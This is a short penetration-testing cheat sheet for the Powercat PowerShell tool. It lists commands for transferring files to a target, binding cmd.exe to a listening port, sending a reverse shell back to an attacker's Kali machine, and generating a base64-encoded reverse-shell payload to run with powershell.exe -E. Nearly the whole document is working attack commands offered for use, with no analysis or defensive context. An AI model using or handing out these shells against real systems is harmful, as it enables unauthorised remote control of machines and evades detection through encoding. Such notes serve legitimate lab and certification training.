## Powercat

### Powercat Installation
Install `powercat` on Kali machine:
```bash
sudo apt install powercat
```
Powercat is located in `usr/share/windows-resources/powercat`

Transfer `powercat` to target machine using methods found [here]()

### Powercat File Transfers
Send file from **Kali** machine to **target**
```bash
sudo nc -nvlp $PORT > $FILENAME
```
Catch the file on **target**:
```bash
powercat -c $IP -p $PORT -i $DOWNLOAD_PATH
```


### Powercat Bind Shells
Import `powercat` in powershell:
```powershell
import-module .\powercat.ps1
```

Create listener on **target** machine:
```powershell
powercat -l -p $PORT -e cmd.exe
```

Connect to **target** from **Kali** machine:
```bash
nc $KALI_IP $PORT
```

### Powercat Reverse Shells
Import `powercat` in powershell:
```powershell
import-module .\powercat.ps1
```

Create listener on **Kali** machine: 
```bash
sudo nc -nvlp $PORT
```

Connect **target** to **Kali** machine
```powershell
powercat -c $KALI_IP -p $PORT -e cmd.exe
```

### Powercat Payload

Generate `powercat` payload, and create reverse shell:
```powershell
powercat -c $KALI_IP -p $PORT -e cmd.exe -g > reverseshell.ps1 && ./reverseshell.ps1
```



First, have listener run on **Kali** machine:
```bash
sudo nc -nvlp $PORT
```

Generate encoded `powercat` reverse shell:
```powershell
powercat -c $KALI_IP -p $PORT -e cmd.exe -ge > encodedreverseshell.ps1

powershell.exe -E $(type encodedreverseshell.ps1)
```
